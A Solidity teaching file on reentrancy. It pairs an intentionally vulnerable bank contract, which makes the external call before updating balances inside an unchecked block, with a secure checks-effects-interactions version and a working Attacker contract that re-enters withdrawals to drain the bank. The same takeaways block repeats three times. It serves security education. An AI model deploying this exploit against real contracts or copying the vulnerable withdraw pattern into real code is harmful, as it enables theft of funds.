// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableBank
 * @notice INTENTIONALLY VULNERABLE - demonstrates reentrancy attack vector
 * 
 * PURPOSE: Shows the danger of external calls before state updates
 * CS CONCEPT: Race condition - attacker can re-enter with old state
 * CONNECTION: Project 02 CEI pattern (this violates it!)
 * 
 * VULNERABILITY: External call before state update allows reentrancy
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() public payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // ❌ VULNERABLE: External call before state update
    // NOTE: We use unchecked to allow the underflow that occurs when the call stack unwinds.
    // In Solidity 0.8+, checked math would revert on 0 - amount. Real vulnerable contracts
    // (e.g. pre-0.8 or using unchecked) allowed this—the balance wraps and the attacker
    // drains the bank. This preserves the teaching: CEI prevents the attack entirely.
    function withdrawVulnerable(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // DANGER: External call before updating state
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // TOO LATE: Attacker already re-entered. unchecked avoids underflow on unwind.
        unchecked {
            balances[msg.sender] -= amount;
        }
        emit Withdrawal(msg.sender, amount);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * ═══════════════════════════════════════════════════════════════════════════
 *                          KEY TAKEAWAYS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * 1. CHECKS-EFFECTS-INTERACTIONS PATTERN IS CRITICAL
 *    ✅ Step 1: CHECKS - Validate conditions first
 *    ✅ Step 2: EFFECTS - Update state second
 *    ✅ Step 3: INTERACTIONS - External calls last
 *    ✅ Prevents reentrancy attacks
 *    ✅ Used by ALL secure contracts (Uniswap, Aave, Compound)
 *
 * 2. REENTRANCY ATTACKS ARE STILL COMMON
 *    ✅ $60M The DAO hack (2016)
 *    ✅ Still happening in DeFi today
 *    ✅ Can drain entire contracts
 *    ✅ Always follow CEI pattern!
 *
 * 3. UPDATE STATE BEFORE EXTERNAL CALLS
 *    ✅ If state updated first, re-entered calls fail
 *    ✅ If external call first, attacker can drain contract
 *    ✅ Order matters! Effects before Interactions!
 *
 * 4. USE REENTRANCYGUARD FOR COMPLEX CONTRACTS
 *    ✅ OpenZeppelin ReentrancyGuard modifier
 *    ✅ Adds ~2,300 gas overhead
 *    ✅ Protects against cross-function reentrancy
 *    ✅ Use when multiple functions modify same state
 *
 * 5. TEST ATTACKS TO VERIFY SECURITY
 *    ✅ Write attack contracts to test vulnerabilities
 *    ✅ Verify attacks fail on secure implementations
 *    ✅ Understand how attacks work to prevent them
 *
 * 6. EVERY EXTERNAL CALL IS A RISK
 *    ✅ ETH transfers (.call{value:})
 *    ✅ Contract calls (other contracts)
 *    ✅ Delegate calls (proxy patterns)
 *    ✅ Always follow CEI pattern!
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                        COMMON MISTAKES
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * ❌ External calls before state updates (reentrancy vulnerability)
 * ❌ Not using CEI pattern for state-changing functions
 * ❌ Forgetting ReentrancyGuard on complex contracts
 * ❌ Not testing reentrancy attacks
 * ❌ Cross-function reentrancy (harder to detect)
 * ❌ Assuming internal functions are safe (they're not!)
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                          NEXT STEPS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * • Study real-world reentrancy attacks (The DAO, Lendf.me)
 * • Explore cross-function reentrancy patterns
 * • Learn about flash loan attacks
 * • Move to Project 08 to learn about ERC20 tokens
 */

/**
 * @title SecureBank
 * @notice SECURE implementation using Checks-Effects-Interactions (CEI) pattern
 * 
 * PURPOSE: Demonstrates THE most critical security pattern in Solidity
 * CS CONCEPT: State machine - ensure state transitions are atomic
 * CONNECTION: Project 02 (CEI pattern), Project 01 (storage updates)
 * 
 * CEI ORDER: Checks → Effects → Interactions
 * This prevents reentrancy by updating state before external calls
 */
contract SecureBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    /**
     * @notice Deposit ETH into the bank
     * 
     * GAS COST:
     * - SLOAD balance: ~100 gas (warm)
     * - SSTORE balance: ~5,000 gas (warm, non-zero to non-zero)
     * - Event: ~1,500 gas
     * - Total: ~6,600 gas
     */
    function deposit() public payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Secure withdrawal using CEI pattern
     * @dev CS: Atomic state transitions - update state before external calls
     * CONNECTION: Project 02 (CEI pattern), Project 01 (storage), Project 03 (events)
     * 
     * EXECUTION: Checks → Effects → Interactions
     * Why effects first? Prevents re-entrant calls from seeing old state
     */
    function withdraw(uint256 amount) public {
        // CHECKS: Validate conditions
        require(balances[msg.sender] >= amount, "Insufficient balance"); // CONNECTION: Project 01 mapping read
        
        // EFFECTS: Update state FIRST (critical for security!)
        balances[msg.sender] -= amount; // CONNECTION: Project 01 mapping write
        
        // INTERACTIONS: External calls LAST
        (bool success,) = msg.sender.call{value: amount}(""); // CONNECTION: Project 02 ETH transfer
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, amount); // CONNECTION: Project 03 event
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * ═══════════════════════════════════════════════════════════════════════════
 *                          KEY TAKEAWAYS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * 1. CHECKS-EFFECTS-INTERACTIONS PATTERN IS CRITICAL
 *    ✅ Step 1: CHECKS - Validate conditions first
 *    ✅ Step 2: EFFECTS - Update state second
 *    ✅ Step 3: INTERACTIONS - External calls last
 *    ✅ Prevents reentrancy attacks
 *    ✅ Used by ALL secure contracts (Uniswap, Aave, Compound)
 *
 * 2. REENTRANCY ATTACKS ARE STILL COMMON
 *    ✅ $60M The DAO hack (2016)
 *    ✅ Still happening in DeFi today
 *    ✅ Can drain entire contracts
 *    ✅ Always follow CEI pattern!
 *
 * 3. UPDATE STATE BEFORE EXTERNAL CALLS
 *    ✅ If state updated first, re-entered calls fail
 *    ✅ If external call first, attacker can drain contract
 *    ✅ Order matters! Effects before Interactions!
 *
 * 4. USE REENTRANCYGUARD FOR COMPLEX CONTRACTS
 *    ✅ OpenZeppelin ReentrancyGuard modifier
 *    ✅ Adds ~2,300 gas overhead
 *    ✅ Protects against cross-function reentrancy
 *    ✅ Use when multiple functions modify same state
 *
 * 5. TEST ATTACKS TO VERIFY SECURITY
 *    ✅ Write attack contracts to test vulnerabilities
 *    ✅ Verify attacks fail on secure implementations
 *    ✅ Understand how attacks work to prevent them
 *
 * 6. EVERY EXTERNAL CALL IS A RISK
 *    ✅ ETH transfers (.call{value:})
 *    ✅ Contract calls (other contracts)
 *    ✅ Delegate calls (proxy patterns)
 *    ✅ Always follow CEI pattern!
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                        COMMON MISTAKES
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * ❌ External calls before state updates (reentrancy vulnerability)
 * ❌ Not using CEI pattern for state-changing functions
 * ❌ Forgetting ReentrancyGuard on complex contracts
 * ❌ Not testing reentrancy attacks
 * ❌ Cross-function reentrancy (harder to detect)
 * ❌ Assuming internal functions are safe (they're not!)
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                          NEXT STEPS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * • Study real-world reentrancy attacks (The DAO, Lendf.me)
 * • Explore cross-function reentrancy patterns
 * • Learn about flash loan attacks
 * • Move to Project 08 to learn about ERC20 tokens
 */

/**
 * @title Attacker
 * @notice Malicious contract that exploits reentrancy
 * FOR EDUCATIONAL PURPOSES ONLY
 */
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackAmount;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        
        bank.deposit{value: msg.value}();
        bank.withdrawVulnerable(msg.value);
    }
    
    // Fallback function - this is where reentrancy happens
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdrawVulnerable(attackAmount);
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * ═══════════════════════════════════════════════════════════════════════════
 *                          KEY TAKEAWAYS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * 1. CHECKS-EFFECTS-INTERACTIONS PATTERN IS CRITICAL
 *    ✅ Step 1: CHECKS - Validate conditions first
 *    ✅ Step 2: EFFECTS - Update state second
 *    ✅ Step 3: INTERACTIONS - External calls last
 *    ✅ Prevents reentrancy attacks
 *    ✅ Used by ALL secure contracts (Uniswap, Aave, Compound)
 *
 * 2. REENTRANCY ATTACKS ARE STILL COMMON
 *    ✅ $60M The DAO hack (2016)
 *    ✅ Still happening in DeFi today
 *    ✅ Can drain entire contracts
 *    ✅ Always follow CEI pattern!
 *
 * 3. UPDATE STATE BEFORE EXTERNAL CALLS
 *    ✅ If state updated first, re-entered calls fail
 *    ✅ If external call first, attacker can drain contract
 *    ✅ Order matters! Effects before Interactions!
 *
 * 4. USE REENTRANCYGUARD FOR COMPLEX CONTRACTS
 *    ✅ OpenZeppelin ReentrancyGuard modifier
 *    ✅ Adds ~2,300 gas overhead
 *    ✅ Protects against cross-function reentrancy
 *    ✅ Use when multiple functions modify same state
 *
 * 5. TEST ATTACKS TO VERIFY SECURITY
 *    ✅ Write attack contracts to test vulnerabilities
 *    ✅ Verify attacks fail on secure implementations
 *    ✅ Understand how attacks work to prevent them
 *
 * 6. EVERY EXTERNAL CALL IS A RISK
 *    ✅ ETH transfers (.call{value:})
 *    ✅ Contract calls (other contracts)
 *    ✅ Delegate calls (proxy patterns)
 *    ✅ Always follow CEI pattern!
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                        COMMON MISTAKES
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * ❌ External calls before state updates (reentrancy vulnerability)
 * ❌ Not using CEI pattern for state-changing functions
 * ❌ Forgetting ReentrancyGuard on complex contracts
 * ❌ Not testing reentrancy attacks
 * ❌ Cross-function reentrancy (harder to detect)
 * ❌ Assuming internal functions are safe (they're not!)
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                          NEXT STEPS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * • Study real-world reentrancy attacks (The DAO, Lendf.me)
 * • Explore cross-function reentrancy patterns
 * • Learn about flash loan attacks
 * • Move to Project 08 to learn about ERC20 tokens
 */
